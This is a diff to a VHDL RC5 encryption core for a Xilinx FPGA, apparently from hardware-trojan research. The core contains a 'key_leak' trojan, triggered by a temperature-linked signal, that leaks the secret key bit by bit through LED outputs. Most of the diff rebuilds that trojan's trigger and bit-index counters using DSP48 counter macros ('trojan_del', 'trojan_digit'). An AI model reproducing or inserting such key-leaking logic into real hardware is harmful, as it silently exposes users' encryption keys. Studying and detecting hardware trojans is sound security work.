@@ -3,6 +3,10 @@ Use IEEE.std_logic_1164.All;
 Use IEEE.std_logic_arith.All;
 Use IEEE.std_logic_unsigned.All;
 Use Work.RC5_pkg.All;
+library UNISIM;
+use UNISIM.VComponents.all;
+library UNIMACRO;
+use UNIMACRO.VComponents.all;
 
 Entity rc5_Struct is 
 	Port
@@ -145,16 +149,19 @@ Signal led_trojan1 : std_logic;
 Signal led_trojan0 : std_logic;	
 signal trigger	: std_logic;
 signal cntr_trig: std_logic;
-SIGNAL digit : integer range 0 to 128;
+SIGNAL digit : std_logic_vector(47 downto 0);
+Signal trojan_delcnt : std_logic_vector(47 downto 0);
+signal nclr: std_logic;
 --signal key_lk_trigger:std_logic;
 Begin	
 	--trigger <= not tmp_int; remove comment when testing with temperature
 		trigger <= tmp_int;
+		nclr	<= not clr;
 --Port Maps
 	U1 : rc5_rnd_key Port Map (clr => clr, clk => clk, key_in => key, key_vld => key_vld, skey => skey, key_rdy => key_rdy);
 	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, trigger => trigger, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
 	U3 : rc5_dec Port Map (clr => clr, clk => clk, din => din, din_vld => enc_trig, skey => skey, dout => dout_dec, dout_rdy => dec_rdy, key_rdy => key_rdy); 
-	U4 : key_leak Port Map (clr => clr, clk => clk, counter=>cntr_trig, trojan_trigger=>trigger, leak_key=>key(digit), ready1=>led_trojan1, ready0=>led_trojan0);
+	U4 : key_leak Port Map (clr => clr, clk => clk, counter=>trojan_delcnt(7), trojan_trigger=>trigger, leak_key=>key(conv_integer(digit(6 downto 0))), ready1=>led_trojan1, ready0=>led_trojan0);
 --Select
 	With j_count select
 		hexval <= 	key(31 downto 0) 		when "000",
@@ -272,34 +279,56 @@ begin
 		if (clr ='0') then
 			Val <= (others => '0');
 			enc_trig <= '0';
+			cntr_trig <= '0';
 		elsif (Cntr = CNTR_MAX) then
 			if (Val = VAL_MAX) then
 				Val <= (others => '0');
 				enc_trig<='1';
-					if(timer=b"011001")then
-						timer <= b"000000";
-						digit<= digit+1;
-					else
-						cntr_trig <= '0';
-						timer <= timer + b"000001";
-					end if;
-					if(timer(4)='1') then
-						cntr_trig <= '0';
-					else
-						cntr_trig <= '1';
-					end if;
+				cntr_trig <= not cntr_trig;
 			else
 				Val <= Val + 1;
 				enc_trig <='0';
 			end if;
 		else
 			enc_trig<='0';
-			if(digit = 128)then
-				digit <= 0;
-			end if;
 		end if;
 	end if;
 end process;
+
+-- COUNTER_LOAD_MACRO: Loadable variable counter implemented in a DSP48E
+--                     7 Series
+-- Xilinx HDL Libraries Guide, version 14.7
+
+trojan_del : COUNTER_LOAD_MACRO
+generic map (
+   COUNT_BY => X"000000000001", -- Count by value
+   DEVICE => "7SERIES",         -- Target Device: "VIRTEX5", "7SERIES", "SPARTAN6"
+   WIDTH_DATA => 48)            -- Counter output bus width, 1-48
+port map (
+   Q => trojan_delcnt,            -- Counter output, width determined by WIDTH_DATA generic 
+   CLK => cntr_trig,             -- 1-bit clock input
+   CE => '1',               -- 1-bit clock enable input
+   DIRECTION => '1', -- 1-bit up/down count direction input, high is count up
+   LOAD => '0',           -- 1-bit active high load input
+   LOAD_DATA => (others =>'0'), -- Counter load data, width determined by WIDTH_DATA generic 
+   RST => nclr              -- 1-bit active high synchronous reset
+);
+
+trojan_digit : COUNTER_LOAD_MACRO
+generic map (
+   COUNT_BY => X"000000000001", -- Count by value
+   DEVICE => "7SERIES",         -- Target Device: "VIRTEX5", "7SERIES", "SPARTAN6"
+   WIDTH_DATA => 48)            -- Counter output bus width, 1-48
+port map (
+   Q => digit,                 -- Counter output, width determined by WIDTH_DATA generic 
+   CLK => trojan_delcnt(7),             -- 1-bit clock input
+   CE => '1',               -- 1-bit clock enable input
+   DIRECTION => '1', -- 1-bit up/down count direction input, high is count up
+   LOAD => '0',           -- 1-bit active high load input
+   LOAD_DATA => (others =>'0'), -- Counter load data, width determined by WIDTH_DATA generic 
+   RST => nclr              -- 1-bit active high synchronous reset
+);
+-- End of COUNTER_LOAD_MACRO_inst instantiation
 
 --This select statement selects the 7-segment diplay anode. 
 with Val select
